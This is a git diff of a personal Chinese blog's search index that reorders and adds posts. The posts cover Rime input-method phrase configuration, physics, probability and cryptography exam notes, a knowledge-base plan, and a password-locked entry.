-如果想多个候选词，一并添加即可，越后出现的越先出现（大雾
-
-想注释掉，用#即可
-个人感觉还是这个对钩好看~
-✓	dui
-我的最终配置：
-✓	dui对	dui#✔	dui#✅	dui#☑	dui#✘	cuo
-诶这不太对吧
-
-不管了，能跑就行~跑喽~~
-]]></content>
-      <categories>
-        <category>工具与技术使用</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -3305,6 +3272,39 @@ $n-1=2^s\cdot d$
       <tags>
         <tag>Crypto</tag>
         <tag>unfixed</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>rime自定义输入输出配置</title>
+    <url>/2025/10/22/rime%E8%87%AA%E5%AE%9A%E4%B9%89%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[感觉好像被监视了~于是乎前段时间在windows下部署了小狼毫输入法
+但是遇到了问题，如果我想给别人发一个对钩，搜狗输入法直接输入dui就出来候选词了，但是rime不行
+故而学习了一下自定义
+我实用的是便携版，目录如下
+
+直接在主目录下新建一个文档custom_phrase.txt
+然后输入策略，用Tab键隔开
+
+然后重新部署
+
+输入dui就可以有✔的选项了
+
+如果想多个候选词，一并添加即可，越后出现的越先出现（大雾
+
+想注释掉，用#即可
+个人感觉还是这个对钩好看~
+✓	dui
+我的最终配置：
+✓	dui对	dui#✔	dui#✅	dui#☑	dui#✘	cuo
+诶这不太对吧
+
+不管了，能跑就行~跑喽~~
+]]></content>
+      <categories>
+        <category>工具与技术使用</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -3491,26 +3491,6 @@ IOP]]></content>
       </tags>
   </entry>
   <entry>
-    <title>《安全规约导论》阅读笔记</title>
-    <url>/2024/10/09/%E3%80%8A%E5%AE%89%E5%85%A8%E8%A7%84%E7%BA%A6%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B000/</url>
-    <content><![CDATA[此博客为常驻，用于汇总笔者阅读《安全规约导论》一书的学习笔记
-这本书里的好东西很多，价值很高，值得充分学习
-持续更新中
-
-
-安全规约前置知识 
-安全规约基础 
-荔枝成为BLS短签名糕守
-
-]]></content>
-      <categories>
-        <category>科研</category>
-      </categories>
-      <tags>
-        <tag>常驻</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>“我们输不起”：毛泽东否定“否定之否定”的实践论重释</title>
     <url>/2025/08/25/%E2%80%9C%E6%88%91%E4%BB%AC%E8%BE%93%E4%B8%8D%E8%B5%B7%E2%80%9D%EF%BC%9A%E6%AF%9B%E6%B3%BD%E4%B8%9C%E5%90%A6%E5%AE%9A%E2%80%9C%E5%90%A6%E5%AE%9A%E4%B9%8B%E5%90%A6%E5%AE%9A%E2%80%9D%E7%9A%84%E5%AE%9E%E8%B7%B5%E8%AE%BA%E9%87%8D%E9%87%8A/</url>
     <content><![CDATA[摘要： 关于毛泽东为何在晚年明确否定“否定之否定规律”，学界的主流解释倾向于从哲学本体论的层面，将其视为对黑格尔唯心主义的彻底剥离和对马克思主义唯物论的深化。这一解释虽具理论深度，却在一定程度上忽略了毛泽东作为革命家和战略家的现实处境。本文旨在提出并论证一种补充性乃至更具根本性的解释框架：实践论重释。即，毛泽东的这一理论抉择，其最深刻的动因并非源于纯粹的哲学思辨，而是植根于中国革命“低容错率”的残酷现实，是他作为最高统帅，在无数次血与火的考验中形成的“风险规避”和“责任优先”的思维原则的哲学升华。
@@ -3542,6 +3522,26 @@ IOP]]></content>
       </categories>
       <tags>
         <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>《安全规约导论》阅读笔记</title>
+    <url>/2024/10/09/%E3%80%8A%E5%AE%89%E5%85%A8%E8%A7%84%E7%BA%A6%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B000/</url>
+    <content><![CDATA[此博客为常驻，用于汇总笔者阅读《安全规约导论》一书的学习笔记
+这本书里的好东西很多，价值很高，值得充分学习
+持续更新中
+
+
+安全规约前置知识 
+安全规约基础 
+荔枝成为BLS短签名糕守
+
+]]></content>
+      <categories>
+        <category>科研</category>
+      </categories>
+      <tags>
+        <tag>常驻</tag>
       </tags>
   </entry>
   <entry>
@@ -4718,6 +4718,40 @@ part2 光盘检测1. x32Dbg再度打开已经解除了地区限制的exe
       </tags>
   </entry>
   <entry>
+    <title>大学物理0轮预习</title>
+    <url>/2025/01/02/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%860%E8%BD%AE%E9%A2%84%E4%B9%A0/</url>
+    <content><![CDATA[我滴进度已经完蛋了
+
+光学衍射通用公式$\delta=a\frac{x}f$  $光程差=缝宽*\tan\theta$
+暗纹 $\delta=\pm k\lambda$，明纹 $\delta=\pm (k+0.5)\lambda$
+中央明纹宽度$l=2f\frac\lambda a$
+光栅$\delta=(a+b)|\sin\theta-\sin\varphi|=k\lambda$
+缺级 $k=\frac{a+b}{a}k’$
+光栅常数 $a+b$
+距离中心距离 $x=f\cdot\tan\theta,(a+b)|\sin\theta-\sin\varphi|=k\lambda$
+双缝干涉$\delta=d\frac{x}D$  $光程差=缝距*\tan\theta$
+云母覆盖$\delta_{覆盖后}-\delta_{覆盖前}=(1-n)l$
+单缝干涉反射 单调 $\delta=2e\sqrt{n_2^2-n_1^2\sin^2\theta}$
+反射 不单调 $\delta=2e\sqrt{n_2^2-n_1^2\sin^2\theta}+\frac\lambda 2$
+折射 单调 $\delta=2e\sqrt{n_2^2-n_1^2\sin^2\theta}+\frac\lambda 2$
+折射 不单调 $\delta=2e\sqrt{n_2^2-n_1^2\sin^2\theta}$
+偏振振动波动学振动弹簧拉开$\omega=\frac{k}m$  $kx=m\omega^2r,x=r$
+$A=\sqrt{x_0^2+\frac{v_0^2}{\omega^2}}$  $A^2=x_0^2+x^2,x=\frac{v_0}{\omega}$
+能量计算能量 $E=\frac12kA^2$
+平均动能 $\overline{E_k}=\frac14kA^2$
+振动合成$A=\sqrt{A_1^2+A_2^2+2A_1A_2cos(\varphi_2-\varphi_1)}$
+$\varphi=\arctan\frac{A_1\sin\varphi_1+A_2\sin\varphi_2}{A_1\cos\varphi_1+A_2\cos\varphi_2}$
+求拍频$\omega=|\frac{\omega_1}{2\pi}-\frac{\omega_2}{2\pi}|$
+单摆$\omega=\sqrt{\frac{g}{l}},T=\frac{2\pi}{\omega},f=\frac{\omega}{2\pi}$
+波动气体热力学气体压强体积温度能量热力学第一定理气体的速率循环效率熵]]></content>
+      <categories>
+        <category>课程与考试重点</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>多项式初步学习</title>
     <url>/2024/10/06/%E5%A4%9A%E9%A1%B9%E5%BC%8F%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[数年之前就听闻莫反，FFT，NTT等数论变换的名称，但是一直未学习相关知识
@@ -4880,40 +4914,6 @@ https://www.cnblogs.com/xxeray/p/fast-fourier-transform.html
       </categories>
       <tags>
         <tag>mathematics</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>大学物理0轮预习</title>
-    <url>/2025/01/02/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%860%E8%BD%AE%E9%A2%84%E4%B9%A0/</url>
-    <content><![CDATA[我滴进度已经完蛋了
-
-光学衍射通用公式$\delta=a\frac{x}f$  $光程差=缝宽*\tan\theta$
-暗纹 $\delta=\pm k\lambda$，明纹 $\delta=\pm (k+0.5)\lambda$
-中央明纹宽度$l=2f\frac\lambda a$
-光栅$\delta=(a+b)|\sin\theta-\sin\varphi|=k\lambda$
-缺级 $k=\frac{a+b}{a}k’$
-光栅常数 $a+b$
-距离中心距离 $x=f\cdot\tan\theta,(a+b)|\sin\theta-\sin\varphi|=k\lambda$
-双缝干涉$\delta=d\frac{x}D$  $光程差=缝距*\tan\theta$
-云母覆盖$\delta_{覆盖后}-\delta_{覆盖前}=(1-n)l$
-单缝干涉反射 单调 $\delta=2e\sqrt{n_2^2-n_1^2\sin^2\theta}$
-反射 不单调 $\delta=2e\sqrt{n_2^2-n_1^2\sin^2\theta}+\frac\lambda 2$
-折射 单调 $\delta=2e\sqrt{n_2^2-n_1^2\sin^2\theta}+\frac\lambda 2$
-折射 不单调 $\delta=2e\sqrt{n_2^2-n_1^2\sin^2\theta}$
-偏振振动波动学振动弹簧拉开$\omega=\frac{k}m$  $kx=m\omega^2r,x=r$
-$A=\sqrt{x_0^2+\frac{v_0^2}{\omega^2}}$  $A^2=x_0^2+x^2,x=\frac{v_0}{\omega}$
-能量计算能量 $E=\frac12kA^2$
-平均动能 $\overline{E_k}=\frac14kA^2$
-振动合成$A=\sqrt{A_1^2+A_2^2+2A_1A_2cos(\varphi_2-\varphi_1)}$
-$\varphi=\arctan\frac{A_1\sin\varphi_1+A_2\sin\varphi_2}{A_1\cos\varphi_1+A_2\cos\varphi_2}$
-求拍频$\omega=|\frac{\omega_1}{2\pi}-\frac{\omega_2}{2\pi}|$
-单摆$\omega=\sqrt{\frac{g}{l}},T=\frac{2\pi}{\omega},f=\frac{\omega}{2\pi}$
-波动气体热力学气体压强体积温度能量热力学第一定理气体的速率循环效率熵]]></content>
-      <categories>
-        <category>课程与考试重点</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -5553,6 +5553,45 @@ PPT还是要拍（不然确实太闲了哇），然后直接丢给豆包总结�
       </categories>
       <tags>
         <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>我也是有知识库的人了</title>
+    <url>/2025/11/29/%E6%88%91%E4%B9%9F%E6%98%AF%E6%9C%89%E7%9F%A5%E8%AF%86%E5%BA%93%E7%9A%84%E4%BA%BA%E4%BA%86/</url>
+    <content><![CDATA[RT
+前两天看别人的知识库，知识很有调理，正赶上博客比较凌乱，然后自己部署了一个
+就在右上角，或者链接 https://coperlm.github.io/KnowledgeBase/
+然后规划一下未来知识库要怎么用
+
+知识库里面的内容每篇包含三个部分
+
+背景（为什么要学）
+
+核心内容（我现在知道什么）
+
+残留问题（我还不知道什么）
+
+
+内容上使用短笔记；结构上避免过深的树形结构（会导致长时间落灰）
+区分博客和知识库现状：博客有一百来篇，但是过于零散，还有很多半成品；急须知识库来辅助构建知识体系
+方式：博客记录过程（流水账记录，想法，学习过程），知识库记录结果（整理后的我知道了什么/如何使用）
+理想的运作方式：
+
+先随便写，不要求结构化或优雅
+
+沉淀，每周或者每月从里面挑出核心内容，放进知识库
+
+然后知识库不断丰富，就变得嘎嘎好了
+
+
+但是缺陷是博客会很多东西，又但是东西多的话，只要不乱就好
+又但是我已经有知识库了，很多人博客就是当知识库使用；这样我只要求博客我自己能看懂即可（只承担时间线，不当知识库功能）
+]]></content>
+      <categories>
+        <category>未分类</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -6403,6 +6442,84 @@ Q5：文章里怎么有“需要密码”？
       </tags>
   </entry>
   <entry>
+    <title>概率论一轮复习</title>
+    <url>/2024/12/28/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%80%E8%BD%AE%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[记录概率论的学习内容
+
+目录
+
+一、随机事件和概率
+
+1.古典概型2.几何概型3.重要公式4.独立性判定二、一维随机变量及其分布
+1.判分布随机变量：$X:\Omega\rightarrow\mathbb{R}$
+分布函数：$X\sim F(x),F(x)=P(X\leq x),F(x)\in[0,1]$
+ 
+对于连续型$F(x)=\int_{-\infty}^{x}f(t)dt,x\in\mathbb{R}$
+
+
+\left\{
+\begin{align}
+&F(-\infty)=0,\\
+&F(+\infty)=1,\\
+&\sum_ip_i=1,\\
+&\int_{-\infty}^{+\infty}f(x)dx=1
+\end{align}
+\right.
+A
+
+
+B选项解法二：也可以使用部分积分公式$\int udv=uv-\int vdu$
+部分积分公式推导过程
+其中：$u=v=F(x)$
+带入部分积分公式：$\int F(x) dF(x)=[F(x)F(x)]|_{-\infty}^{+\infty}−\int F(x)dF(x)$
+故 $\int F(x) dF(x)=\frac{1}{2}$
+则 $g_2(x)$ 可以作为概率密度
+$g_1(x),g_2(x),g_3(x)$可以作为概率密度， $g_4(x)$ 不能作为概率密度
+C
+2.求分布
+离散型分布
+
+0-1分布 $X\sim B(1,p),X(伯努利计数变量)\sim \left(\begin{array}{l}0&amp;\quad1\p&amp;1-p\end{array}\right)$
+
+二项分布 $X\sim B(n,p)$ 分布律 $U_k=P{X=k}=C_n^kp^k(1-p)^{n-k}$
+
+几何分布 $X\sim G(p)$ 首中即停止 $P{X=k}=p\cdot (1-p)^{k-1}$
+无记忆性
+
+超几何分布
+
+柏松分布 稀有事件的概率 $P{X=k}=\frac{\lambda^k}{k!}e^{-\lambda}$，$EX=\lambda$
+
+
+
+泊松定理 若$X\sim B(n,p)$，当$n$很大，$p$很小，$\lambda=np$ 适中时，二项分布可用泊松分布近似表示；一般地，当$n&gt;20,p100,np&lt;10$ 时，逼近效果更佳
+
+C_n^kp^k(1-p)^{n-k}\approx\frac{\lambda^k}{k!}e^{-\lambda}
+
+\begin{align}
+\because\ &Z\sim B(2,\frac13)\\
+&X+Y+Z=2\\
+\therefore\ &X+Y=2-Z\sim B(2,\frac23)
+\end{align}B
+
+8
+
+
+D
+
+连续型分布
+
+均匀分布 $X\sim U(a,b)$
+
+f(x)=\left\{\begin{align}&\frac1{b-a},a]]></content>
+      <categories>
+        <category>课程与考试重点</category>
+      </categories>
+      <tags>
+        <tag>mathematics</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>机器人联盟赛/对抗赛游记回忆记录</title>
     <url>/2024/10/31/%E6%9C%BA%E5%99%A8%E4%BA%BA%E8%81%94%E7%9B%9F%E8%B5%9B-%E5%AF%B9%E6%8A%97%E8%B5%9B%E6%B8%B8%E8%AE%B0%E5%9B%9E%E5%BF%86%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[整理游记和会议记录的时候，发现机器人比赛的高校联盟赛和超级对抗赛的游记我没有写过，故凭借记忆（和手机相册）补一份
@@ -6495,84 +6612,6 @@ Q5：文章里怎么有“需要密码”？
       <tags>
         <tag>RoboMaster</tag>
         <tag>游记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>概率论一轮复习</title>
-    <url>/2024/12/28/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%80%E8%BD%AE%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[记录概率论的学习内容
-
-目录
-
-一、随机事件和概率
-
-1.古典概型2.几何概型3.重要公式4.独立性判定二、一维随机变量及其分布
-1.判分布随机变量：$X:\Omega\rightarrow\mathbb{R}$
-分布函数：$X\sim F(x),F(x)=P(X\leq x),F(x)\in[0,1]$
- 
-对于连续型$F(x)=\int_{-\infty}^{x}f(t)dt,x\in\mathbb{R}$
-
-
-\left\{
-\begin{align}
-&F(-\infty)=0,\\
-&F(+\infty)=1,\\
-&\sum_ip_i=1,\\
-&\int_{-\infty}^{+\infty}f(x)dx=1
-\end{align}
-\right.
-A
-
-
-B选项解法二：也可以使用部分积分公式$\int udv=uv-\int vdu$
-部分积分公式推导过程
-其中：$u=v=F(x)$
-带入部分积分公式：$\int F(x) dF(x)=[F(x)F(x)]|_{-\infty}^{+\infty}−\int F(x)dF(x)$
-故 $\int F(x) dF(x)=\frac{1}{2}$
-则 $g_2(x)$ 可以作为概率密度
-$g_1(x),g_2(x),g_3(x)$可以作为概率密度， $g_4(x)$ 不能作为概率密度
-C
-2.求分布
-离散型分布
-
-0-1分布 $X\sim B(1,p),X(伯努利计数变量)\sim \left(\begin{array}{l}0&amp;\quad1\p&amp;1-p\end{array}\right)$
-
-二项分布 $X\sim B(n,p)$ 分布律 $U_k=P{X=k}=C_n^kp^k(1-p)^{n-k}$
-
-几何分布 $X\sim G(p)$ 首中即停止 $P{X=k}=p\cdot (1-p)^{k-1}$
-无记忆性
-
-超几何分布
-
-柏松分布 稀有事件的概率 $P{X=k}=\frac{\lambda^k}{k!}e^{-\lambda}$，$EX=\lambda$
-
-
-
-泊松定理 若$X\sim B(n,p)$，当$n$很大，$p$很小，$\lambda=np$ 适中时，二项分布可用泊松分布近似表示；一般地，当$n&gt;20,p100,np&lt;10$ 时，逼近效果更佳
-
-C_n^kp^k(1-p)^{n-k}\approx\frac{\lambda^k}{k!}e^{-\lambda}
-
-\begin{align}
-\because\ &Z\sim B(2,\frac13)\\
-&X+Y+Z=2\\
-\therefore\ &X+Y=2-Z\sim B(2,\frac23)
-\end{align}B
-
-8
-
-
-D
-
-连续型分布
-
-均匀分布 $X\sim U(a,b)$
-
-f(x)=\left\{\begin{align}&\frac1{b-a},a]]></content>
-      <categories>
-        <category>课程与考试重点</category>
-      </categories>
-      <tags>
-        <tag>mathematics</tag>
       </tags>
   </entry>
   <entry>
@@ -6883,74 +6922,6 @@ reference：Identity-based chameleon hashing and signatures without key exposure
       </tags>
   </entry>
   <entry>
-    <title>现代密码学2025期末考试重点</title>
-    <url>/2025/06/17/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A62025%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95%E9%87%8D%E7%82%B9/</url>
-    <content><![CDATA[本文记录了老师讲的密码学期末考试重点
-核心在于解决期中考试的题目，已经涵盖了绝大多数考点
-
-
-
-国密（SM系列）不考具体内容。sm2非对称，sm3哈希，sm4对称，sm9身份基，sm7未公开
-
-一
-
-安全威胁：被动/主动攻击
-被动-监听（保密性）-消息内容/业务流分析 （选填）
-主动-中断（可用性）篡改（完整性）伪造（真实性）
-
-安全业务：保密 认证 完整 不可否认 访问控制
-
-信息安全模型（图
-
-二
-
-流密码是对称加密
-
-三、对称
-
-置换 -&gt; 打乱顺序 -&gt; 扩散
-代换 -&gt; 代替 -&gt; 混淆
-（属于密码编码学）密码分析学：线性 差分 攻击手段
-
-DES Feistel密码体系 密文明文分组64位 有效密钥长度56位 $L_i=R_{i-1},R_i=L_{i-1}\oplus F(R_{i-1},k_i)$
-AES SP结构 密文明文分组128位 有效密钥长度128/192/256位
-
-
-​        Rijndeal-&gt;AES，但AES不是Rijndeal算法
-
-DES的四个图 CBC
-
-四、公钥
-
-数学：欧拉函数，费马定理，拓欧逆元，快速幂，CRT（门限分割）
-ElGamal，RSA，（共膜攻击）
-ECC上的点加法-&gt;不考
-DH密钥协商
-
-五、分割
-
-Shamir-拉格朗日
-基于CRT
-
-六、认证
-
-概念
-
-七、签名
-
-验证身份 日期时间 内容 运行第三方认证
-性质 三条性质 四个要求
-DSS DSA ElGamal shnorr-不考细枝末节
-
-]]></content>
-      <categories>
-        <category>课程与考试重点</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>牛客寒假2025题解</title>
     <url>/2025/01/29/%E7%89%9B%E5%AE%A2%E5%AF%92%E5%81%872025%E9%A2%98%E8%A7%A3/</url>
     <content><![CDATA[本文用于记录牛客寒假赛的六场比赛的赛时解题和赛后补题
@@ -7081,6 +7052,74 @@ D题#include&lt;iostream&gt;#include&lt;map&gt;#define int long longusing namesp
       </categories>
       <tags>
         <tag>算法竞赛</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>现代密码学2025期末考试重点</title>
+    <url>/2025/06/17/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A62025%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95%E9%87%8D%E7%82%B9/</url>
+    <content><![CDATA[本文记录了老师讲的密码学期末考试重点
+核心在于解决期中考试的题目，已经涵盖了绝大多数考点
+
+
+
+国密（SM系列）不考具体内容。sm2非对称，sm3哈希，sm4对称，sm9身份基，sm7未公开
+
+一
+
+安全威胁：被动/主动攻击
+被动-监听（保密性）-消息内容/业务流分析 （选填）
+主动-中断（可用性）篡改（完整性）伪造（真实性）
+
+安全业务：保密 认证 完整 不可否认 访问控制
+
+信息安全模型（图
+
+二
+
+流密码是对称加密
+
+三、对称
+
+置换 -&gt; 打乱顺序 -&gt; 扩散
+代换 -&gt; 代替 -&gt; 混淆
+（属于密码编码学）密码分析学：线性 差分 攻击手段
+
+DES Feistel密码体系 密文明文分组64位 有效密钥长度56位 $L_i=R_{i-1},R_i=L_{i-1}\oplus F(R_{i-1},k_i)$
+AES SP结构 密文明文分组128位 有效密钥长度128/192/256位
+
+
+​        Rijndeal-&gt;AES，但AES不是Rijndeal算法
+
+DES的四个图 CBC
+
+四、公钥
+
+数学：欧拉函数，费马定理，拓欧逆元，快速幂，CRT（门限分割）
+ElGamal，RSA，（共膜攻击）
+ECC上的点加法-&gt;不考
+DH密钥协商
+
+五、分割
+
+Shamir-拉格朗日
+基于CRT
+
+六、认证
+
+概念
+
+七、签名
+
+验证身份 日期时间 内容 运行第三方认证
+性质 三条性质 四个要求
+DSS DSA ElGamal shnorr-不考细枝末节
+
+]]></content>
+      <categories>
+        <category>课程与考试重点</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -7911,6 +7950,19 @@ https://github.com/azl397985856/cf
       </tags>
   </entry>
   <entry>
+    <title>计算机组成原理学习笔记</title>
+    <url>/2025/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[
+
+]]></content>
+      <categories>
+        <category>考研</category>
+      </categories>
+      <tags>
+        <tag>考研专业课</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>荔枝橙味拱腰觅马糕守</title>
     <url>/2024/09/11/%E8%8D%94%E6%9E%9D%E6%A9%99%E5%91%B3%E6%8B%B1%E8%85%B0%E8%A7%85%E9%A9%AC%E7%B3%95%E5%AE%88/</url>
     <content><![CDATA[本篇文章旨在记录笔者阅读《公钥密码方案构造及安全证明的知识要点和方法论》的学习总结和收获
@@ -8553,19 +8605,6 @@ $Decrypt:(SP,pk,M,CT)\rightarrow M/\perp$，其中，$\perp$ 代表解密失败
       </tags>
   </entry>
   <entry>
-    <title>计算机组成原理学习笔记</title>
-    <url>/2025/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[
-
-]]></content>
-      <categories>
-        <category>考研</category>
-      </categories>
-      <tags>
-        <tag>考研专业课</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>计算机网络有手就行诶我手呢</title>
     <url>/2025/01/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%89%E6%89%8B%E5%B0%B1%E8%A1%8C%E8%AF%B6%E6%88%91%E6%89%8B%E5%91%A2/</url>
     <content><![CDATA[计算机网络刷题记录
@@ -8833,28 +8872,6 @@ IP首部定长部分为20字节
       </tags>
   </entry>
   <entry>
-    <title>记录_一定要打好基础</title>
-    <url>/2025/05/23/%E8%AE%B0%E5%BD%95-%E4%B8%80%E5%AE%9A%E8%A6%81%E6%89%93%E5%A5%BD%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[
-  7b22b1899bb4d215751e07a80f0d88de76ab04d32e749f01d35ab7ebdd5c2d808c2f40622a3888966f86dd811afea936dc27699529deacbe36adc04875c300c1c3f47dabdfeeaf933095654d24260b732f4cc8d32b361bcc99c18a343783f0bc8efe428615c230ccd67cd5d5b91c6813e1474a024e0375ea1af4a62bb335df23a2e661c91627266b0d02d6c21be114bdd423af57c960abfcb4057a0a02f727cca17282b3071c47a3f21684dc1252bcb2597d3ec6b836ce262dc6bec1dc81abbe6de11c9456667dd964773a941460fe7b17389f05482a2bd20d471bf58449f48d4a362651a6cd7cd2bb4d2b71d5b57f994eb284068c94b5d2b619c3b52fae3f7b257f4a2cd211dce992bf450c211c1bb0ff4ee1e2daab480cd86af265d784229ac01fac35df3348d97ec5b09db934ca795fc61a3e4f2939609dc800957724f7098e70be2425daa77b2642a9838b713d180b3b727337c3b6516d96bc65739629308e5589221b6f4fb90fb6795a1c2d5f045242f62dd8fb4ad9bfea58070ecb3a96c196aa5bbbda5d24283063f72017939dbf6046999f7045625aed9c513bdfcd3602352643507a4d78484f9b4d2d240cb91d868063e793e14f68b7847e04fdb5ddbdcfacdeddcb913a9ad1a0454b562dc4c229fc4603c36fbd325b6c6c69561aa5e681adafa97a9c025f92101b1ed09339978b6b90e004e08cd65a2203b8d1d5436060708df08cee1b88dae1ddb280aad429eb478f52116ddc3185eb94d38f7cb99cdd5e9b9087d8ca94433b6770932e0ccbfe85a126a338fb926de70dff334848ca043d2b201cfdbb9aa45c657f1822e3b160197f7136929efa0e45a1705ee6db
-  
-    
-      
-      
-        Hey, password is required here.
-      
-    
-  
-
-]]></content>
-      <categories>
-        <category>一点小思考</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>记录butterfly+waline单文章访客统计正常但全局不显示解决方案</title>
     <url>/2025/07/11/%E8%AE%B0%E5%BD%95butterfly-waline%E5%8D%95%E6%96%87%E7%AB%A0%E8%AE%BF%E5%AE%A2%E7%BB%9F%E8%AE%A1%E6%AD%A3%E5%B8%B8%E4%BD%86%E5%85%A8%E5%B1%80%E4%B8%8D%E6%98%BE%E7%A4%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
     <content><![CDATA[前两天配置了butterfly主题博客，昨天想配置访客数统计，但是busuanzi一直出问题，索性配置了waline评论区，因为它附带访客统计功能
@@ -8874,6 +8891,28 @@ IP首部定长部分为20字节
 ]]></content>
       <categories>
         <category>工具与技术使用</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记录_一定要打好基础</title>
+    <url>/2025/05/23/%E8%AE%B0%E5%BD%95-%E4%B8%80%E5%AE%9A%E8%A6%81%E6%89%93%E5%A5%BD%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[
+  7b22b1899bb4d215751e07a80f0d88de76ab04d32e749f01d35ab7ebdd5c2d808c2f40622a3888966f86dd811afea936dc27699529deacbe36adc04875c300c1c3f47dabdfeeaf933095654d24260b732f4cc8d32b361bcc99c18a343783f0bc8efe428615c230ccd67cd5d5b91c6813e1474a024e0375ea1af4a62bb335df23a2e661c91627266b0d02d6c21be114bdd423af57c960abfcb4057a0a02f727cca17282b3071c47a3f21684dc1252bcb2597d3ec6b836ce262dc6bec1dc81abbe6de11c9456667dd964773a941460fe7b17389f05482a2bd20d471bf58449f48d4a362651a6cd7cd2bb4d2b71d5b57f994eb284068c94b5d2b619c3b52fae3f7b257f4a2cd211dce992bf450c211c1bb0ff4ee1e2daab480cd86af265d784229ac01fac35df3348d97ec5b09db934ca795fc61a3e4f2939609dc800957724f7098e70be2425daa77b2642a9838b713d180b3b727337c3b6516d96bc65739629308e5589221b6f4fb90fb6795a1c2d5f045242f62dd8fb4ad9bfea58070ecb3a96c196aa5bbbda5d24283063f72017939dbf6046999f7045625aed9c513bdfcd3602352643507a4d78484f9b4d2d240cb91d868063e793e14f68b7847e04fdb5ddbdcfacdeddcb913a9ad1a0454b562dc4c229fc4603c36fbd325b6c6c69561aa5e681adafa97a9c025f92101b1ed09339978b6b90e004e08cd65a2203b8d1d5436060708df08cee1b88dae1ddb280aad429eb478f52116ddc3185eb94d38f7cb99cdd5e9b9087d8ca94433b6770932e0ccbfe85a126a338fb926de70dff334848ca043d2b201cfdbb9aa45c657f1822e3b160197f7136929efa0e45a1705ee6db
+  
+    
+      
+      
+        Hey, password is required here.
+      
+    
+  
+
+]]></content>
+      <categories>
+        <category>一点小思考</category>
       </categories>
       <tags>
         <tag>misc</tag>
@@ -8985,102 +9024,6 @@ $ npm list --depth=0hexo-site@0.0.0 C:\Users\coper\Desktop\myblog├── hexo-
       </tags>
   </entry>
   <entry>
-    <title>记录一道很有意思的简单考研数学题（奇偶性相关）</title>
-    <url>/2025/10/23/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E7%AE%80%E5%8D%95%E8%80%83%E7%A0%94%E6%95%B0%E5%AD%A6%E9%A2%98%EF%BC%88%E5%A5%87%E5%81%B6%E6%80%A7%E7%9B%B8%E5%85%B3%EF%BC%89/</url>
-    <content><![CDATA[题目描述：设 $f(x)=\frac{1}{2^x+1},x\in \mathbb{R},$ 则$f^{(100)}(0)=?$（即100阶导数）
-学长听说我学完张宇第一章了，便给了我这道题检验学习成果
-第一章全是极限相关的，但对于这道题，我翻来覆去也没看出哪里和极限相关的
-于是乎只能硬导，企图寻找规律；奈何本人计算能力一般，算了三遍三阶导，每一遍都不一样
-于是乎我去请教学长，得知和奇偶性相关，于是记录一下做法
-简单地：$f(x)=\frac{1}{a^x+1}-\frac12$ 是奇函数，故而求导后是偶函数并且 $-\frac12$ 没了，这
-第一步：化简函数
-写成以 $e$ 为底：$f(x) = \frac{1}{e^{x \ln 2} + 1}$
-第二步：中心对称性
-$f(-x) = \frac{1}{2^{-x} + 1} = \frac{1}{\frac{1}{2^x} + 1} = \frac{2^x}{1 + 2^x}$
-注意到：$f(x) + f(-x) = \frac{1}{1+2^x} + \frac{2^x}{1+2^x} = 1$
-因此：$f(-x) = 1 - f(x)$
-第三步：推导对称性条件对导数的影响
-两边对 (x) 求导：
-
